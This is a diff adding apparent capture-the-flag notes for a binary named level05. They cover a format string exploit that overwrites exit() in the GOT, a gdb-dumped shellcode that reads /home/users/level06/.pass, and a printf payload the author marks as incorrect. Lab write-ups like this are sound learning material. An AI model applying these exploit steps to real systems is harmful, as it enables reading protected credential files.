@@ -1,0 +1,33 @@
+format string attack
+we can export some shellcode, and replace exit relocation address in the GOT to target our shellcode instead
+However the offset is too great to write the address in one go using %nm we will have to write it 4 bytes at a time
+
+gdb level05
+disas exit
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
+...
+b main
+r
+x/50s *((char **) environ)
+0xffffd814:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311\315\200\211\306\353\006\260\001\061\333\315\200\211\363\260\003\203\354\001\215\f$\262\001\315\200\061\333\071\303t\346\260\004\263\001\262\001\315\200\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"
+
+address of exit() in got is 0x080497e0
+address of our shellcode is 0xffffd814
+
+0xffffd814
+
+printf %d 0xffff
+65535
+
+printf %d 0xd814
+55316
+
+./level05
+aaaabbbb%10$p%11$p
+aaaabbbb0x616161610x62626262
+
+We can pass our 2 addresses in $10 and $11
+
+ython -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55308d%10\$hn' + '%10211d%11\$hn'" | ./level05
+INCORRECT COMMAND, NEEDS TWEAKING
